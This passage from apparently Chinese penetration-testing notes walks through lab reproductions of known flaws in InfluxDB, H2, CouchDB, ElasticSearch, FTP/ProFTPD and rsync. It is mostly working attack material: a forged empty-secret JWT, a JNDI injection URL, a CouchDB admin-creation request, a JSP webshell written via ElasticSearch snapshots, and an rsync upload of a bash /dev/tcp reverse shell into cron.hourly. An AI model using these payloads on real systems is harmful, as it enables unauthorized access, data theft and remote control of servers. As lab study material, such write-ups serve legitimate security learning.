&lt;p&gt;环境启动后，访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3lvdXItaXA6ODA4Ni9kZWJ1Zy92YXJz&#34;&gt;http://your-ip:8086/debug/vars&lt;/span&gt; 即可查看一些服务信息，但此时执行 SQL 语句则会出现 401 错误：其中，admin 是一个已经存在的用户， exp 是一个时间戳，代表着这个 token 的过期时间，设置为一个未来的时间戳。借助 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8vJUU2JTlEJUE1JUU3JTk0JTlGJUU2JTg4JTkw&#34;&gt;https://jwt.io/ 来生成&lt;/span&gt; jwt token:&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;alg&amp;quot;: &amp;quot;HS256&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;typ&amp;quot;: &amp;quot;JWT&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;exp&amp;quot;: 1676346267 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将空密钥生成的jwt代入到数据包中进行发送：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Authorization: Bearer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;db=sample&amp;amp;q=show+users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可以尝试查询一些敏感数据，后期是否能得到更高的系统权限需要看这个是否支持，否则的话就是只能读取数据。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;h2-database-jndi注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#h2-database-jndi注入&#34;&gt;#&lt;/a&gt; h2 database jndi 注入&lt;/h4&gt;
&lt;p&gt;H2 database 是一款 Java 内存数据库，多用于单元测试。H2 database 自带一个 Web 管理页面，在 Spirng 开发中，如果我们设置如下选项，即可允许外部用户访问 Web 管理页面，且没有鉴权。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;spring.h2.console.enabled=true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;spring.h2.console.settings.web-allow-others=true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用这个页面，我们可以进行 JNDI 注入攻击，进而在目标环境下执行任意命令。&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;漏洞链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvaDJkYXRhYmFzZS9oMi1jb25zb2xlLXVuYWNjL1JFQURNRS56aC1jbi5tZA==&#34;&gt;https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;启动后，访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3lvdXItaXA6ODA4MC9oMi1jb25zb2xlLyVFNSU4RCVCMyVFNSU4RiVBRiVFNiU5RiVBNSVFNyU5QyU4QiVFNSU4OCVCMA==&#34;&gt;http://your-ip:8080/h2-console / 即可查看到&lt;/span&gt; H2 database 的管理 页面。可以借助这个小工具 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0pvc2VwaFRyaWJiaWFubmkvSk5ESQ==&#34;&gt;https://github.com/JosephTribbianni/JNDI&lt;/span&gt; 简化我们的复现过程。&lt;/p&gt;
&lt;p&gt;首先设置 JNDI 工具中执行的命令为 touch /tmp/success, 然后启动 JNDI-1.0-all.jar，在 h2 console 页面填入 JNDI 类名和 URL 地址：其中，javax.naming. InitialContext 是 JNDI 的工厂类，URL rmi://evil:23456/BypassByEL 是运行 JNDI 工具监听的 RMI 地址。点击连接后，恶意 RMI 成功接收到请求:touch /tmp/success 已成功执行。&lt;/p&gt;
&lt;h4 id=&#34;couchdb-纵向权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#couchdb-纵向权限&#34;&gt;#&lt;/a&gt; Couchdb 纵向权限&lt;/h4&gt;
&lt;p&gt;Apache CouchDB，使用语言用于一个性并成为 “一个完全方便 web 的数据 库”。它是一个使用 JSON 作为存储格式，JavaScript 查询，MapReduce 和 HTTPBBC 作为 API 的 NoSQL 数据库。它应用很广泛，如用在其动态展示平台， Credit Suisse 用在其商品的市场框架，Meebo，用在其内部社交内容平台 (网络 和应用程序)。&lt;/p&gt;
&lt;p&gt;在 2017 年 11 月 15 日，CVE-2017-12635 和 CVE-2017-12636，CVE-2017-12635 可能是由于 Erlang 和 JavaScript 对 JSON 解析方式的不同，导致 语句执行产生差异性导致的。让任意权限管理员，属于不同权限的用户创建权限。影响版本: &amp;lt; 1.7.0 以及 &amp;lt; 2.1.1&lt;/p&gt;
&lt;p&gt;漏洞链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvY291Y2hkYi9DVkUtMjAxNy0xMjYzNS9SRUFETUUuemgtY24ubWQ=&#34;&gt;https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12635/README.zh-cn.md&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发送包含两个约束的数据包：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PUT /_users/org.couchdb.user:vulhub HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;type&amp;quot;: &amp;quot;user&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;name&amp;quot;: &amp;quot;vulhub&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;roles&amp;quot;: [&amp;quot;_admin&amp;quot;],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;roles&amp;quot;: [],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;password&amp;quot;: &amp;quot;vulhub&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;成功创建管理员，密码密码vulhub，再次访问http://your-ip:5984/_utils/，输入账户密码vulhub，可以成功登录。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Couchdb 任意命令执行漏洞的复现地址（直接用脚本完成就可以）:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvY291Y2hkYi9DVkUtMjAxNy0xMjYzNi9SRUFETUUuemgtY24ubWQ=&#34;&gt;https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/README.zh-cn.md&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;es-写-webshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#es-写-webshell&#34;&gt;#&lt;/a&gt; es 写 webshell&lt;/h4&gt;
&lt;p&gt;ElasticSearch 具有备份数据的功能，用户可以传入一个路径，让其将数据备 份到该路径下，且文件名和后缀都可控。所以，如果同文件系统下还跑着其他&lt;br&gt;
服务，如 Tomcat、PHP 等，可以利用 ElasticSearch 的备份功能写入一个 webshell。&lt;/p&gt;
&lt;p&gt;漏洞链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2VsYXN0aWNzZWFyY2gvV29vWXVuLTIwMTUtMTEwMjE2Lw==&#34;&gt;https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;首先创建一个恶意索引文档：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -X POST [http://127.0.0.1:9200/yz.jsp/yz.jsp/1](http://127.0.0.1:9200/yz.jsp/yz.jsp/1) -d&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;&amp;lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&amp;#123;47,116,101,115,116,46,106,115,112&amp;#125;)),new String(new byte[]&amp;#123;114,119&amp;#125;)).write(request.get Parameter(new String(new byte[]&amp;#123;102&amp;#125;)).getBytes());%&amp;gt;&amp;quot;:&amp;quot;test&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;再创建一个恶意的存储库，其中location的值即为我要写入的路径。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -X PUT &amp;#x27;http://127.0.0.1:9200/_snapshot/yz.jsp&amp;#x27; -d &amp;#x27;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;type&amp;quot;: &amp;quot;fs&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;settings&amp;quot;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;location&amp;quot;: &amp;quot;/usr/local/tomcat/webapps/wwwroot/&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;compress&amp;quot;: false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;存储库验证并创建:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -X PUT &amp;quot;http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp&amp;quot; -d &amp;#x27;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;indices&amp;quot;: &amp;quot;yz.jsp&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;ignore_unavailable&amp;quot;: &amp;quot;true&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;include_global_state&amp;quot;: false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;访问http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的webshell。该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其他 elasticSearch 漏洞：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2VsYXN0aWNzZWFyY2g=&#34;&gt;https://vulhub.org/#/environments/elasticsearch&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;应用协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#应用协议&#34;&gt;#&lt;/a&gt; 应用协议&lt;/h3&gt;
&lt;h4 id=&#34;ftp匿名登录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp匿名登录&#34;&gt;#&lt;/a&gt; ftp 匿名登录&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;FTP 的匿名登录一般有三种&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;用户名：anonymous 密码：Email 或者为空&lt;/p&gt;
&lt;p&gt;用户名：FTP 密码：FTP 或者为空&lt;/p&gt;
&lt;p&gt;用户名：USER 密码：pass&lt;/p&gt;
&lt;p&gt;++ 此外 ftp 还可以用 hydra 进行爆破，知道账户 / 密码时候爆破效率更好&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Proftpd 协议漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;漏洞链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Qwa3gvZXhwbG9pdC1DVkUtMjAxNS0zMzA2&#34;&gt;https://github.com/t0kx/exploit-CVE-2015-3306&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python exploit.py --host 123.58.236.76 --port 24967 --path &amp;quot;/var/www/html/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;http://123.58.236.76:19758/backdoor.php?cmd=&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;遇到这些漏洞时需要自行寻找对应版本的进行漏洞验证&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;rsync-未授权-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rsync-未授权-rce&#34;&gt;#&lt;/a&gt; rsync 未授权 RCE&lt;/h4&gt;
&lt;p&gt;rsync 是 Linux 下一款数据备份工具，支持通过 rsync 协议、ssh 协议进行远程文件传输。其中 rsync 协议默认监听 873 端口，如果目标开启了 rsync 服务，并且没有配置 ACL 或访问密码，我们将可以读写目标服务器文件。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;判断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync rsync://123.58.236.76:45854/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;读取文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync rsync://123.58.236.76:45854/src/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync rsync://123.58.236.76:45854/src/etc/passwd ./&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上传文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync -av passwd rsync://123.58.236.76:45854/src/tmp/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync rsync://123.58.236.76:12177/src/etc/crontab /root/cron.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入反弹shell的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo -e &amp;quot;#! /bin/bash\nbash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.83/4444 0&amp;gt;&amp;amp;1&amp;#x27;&amp;quot; &amp;gt; /tmp/shell.sh ; chmod +x shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上传文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync -av shell rsync://123.58.236.76:12177/src/etc/cron.hourly&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听端口等待接受反弹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;msf 和 fofaviewer 批量测试&lt;/strong&gt;&lt;/p&gt;
